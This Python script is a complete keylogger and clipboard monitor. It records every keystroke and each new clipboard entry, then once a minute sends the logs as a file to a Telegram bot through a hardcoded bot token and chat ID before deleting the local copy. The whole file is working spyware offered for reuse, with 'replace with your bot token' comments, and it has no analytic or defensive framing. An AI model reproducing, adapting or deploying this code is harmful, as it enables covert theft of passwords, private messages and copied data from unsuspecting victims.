import os
import threading
import tempfile
import time
import requests
from pynput import keyboard
from datetime import datetime
import pyperclip

# Telegram bot configuration
BOT_TOKEN = "8199817040:AAHvR7_DspBteNuMi5ztepcb3Wf1Pecmhdo"  # Replace with your bot token
CHAT_ID = "5018443124"  # Replace with your chat ID
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

# Temporary file path
TEMP_DIR = tempfile.gettempdir()
LOG_FILE = os.path.join(TEMP_DIR, "keystrokes.txt")

# Keystroke and clipboard buffers
keystrokes = []
clipboard_log = []
last_clipboard = None


def format_key(key):
    """Format special keys and regular characters."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        else:
            # Handle special keys
            key_str = str(key)
            if key_str.startswith('Key.'):
                key_str = key_str.replace('Key.', '')
            special_keys = {
                'space': ' [SPACE] ',
                'enter': ' [ENTER] ',
                'tab': ' [TAB] ',
                'backspace': ' [BACKSPACE] ',
                'ctrl': ' [CTRL] ',
                'cmd': ' [CMD] ',
                'alt': ' [ALT] ',
                'shift': ' [SHIFT] ',
                'esc': ' [ESC] ',
            }
            return special_keys.get(key_str, f' [{key_str.upper()}] ')
    except Exception:
        return ' [UNKNOWN] '


def on_press(key):
    """Capture and store keystrokes."""
    try:
        keystrokes.append(format_key(key))
    except Exception:
        keystrokes.append(' [ERROR] ')


def monitor_clipboard():
    """Monitor clipboard for changes and log new content."""
    global last_clipboard
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard and current_clipboard:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                clipboard_log.append(f"[CLIPBOARD] {timestamp}: {current_clipboard}")
                last_clipboard = current_clipboard
        except Exception as e:
            clipboard_log.append(f"[CLIPBOARD ERROR] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {str(e)}")
        time.sleep(1)  # Check clipboard every second


def save_and_send():
    """Save keystrokes and clipboard logs to file and send to Telegram every minute."""
    while True:
        if keystrokes or clipboard_log:
            # Write to temp file
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(LOG_FILE, 'w', encoding='utf-8') as f:
                f.write(f"Keystrokes logged at {timestamp}:\n")
                if keystrokes:
                    f.write(''.join(keystrokes) + '\n')
                if clipboard_log:
                    f.write('\n'.join(clipboard_log) + '\n')

            # Send to Telegram
            try:
                with open(LOG_FILE, 'rb') as f:
                    files = {'document': (os.path.basename(LOG_FILE), f)}
                    data = {'chat_id': CHAT_ID}
                    response = requests.post(TELEGRAM_API, data=data, files=files)
                    if response.status_code != 200:
                        print(f"Failed to send to Telegram: {response.text}")
            except Exception as e:
                print(f"Error sending to Telegram: {e}")

            # Clear logs and delete file
            keystrokes.clear()
            clipboard_log.clear()
            try:
                os.remove(LOG_FILE)
            except Exception:
                pass

        time.sleep(60)  # Wait 1 minute


def start_keylogger():
    """Start the keylogger in a separate thread."""
    listener = keyboard.Listener(on_press=on_press)
    listener.start()


def main():
    # Start the clipboard monitor in a separate thread
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()

    # Start the Telegram sender in a separate thread
    sender_thread = threading.Thread(target=save_and_send, daemon=True)
    sender_thread.start()

    # Start the keylogger
    start_keylogger()


if __name__ == "__main__":
    main()
    while True:
        print("HEY")
        time.sleep(1)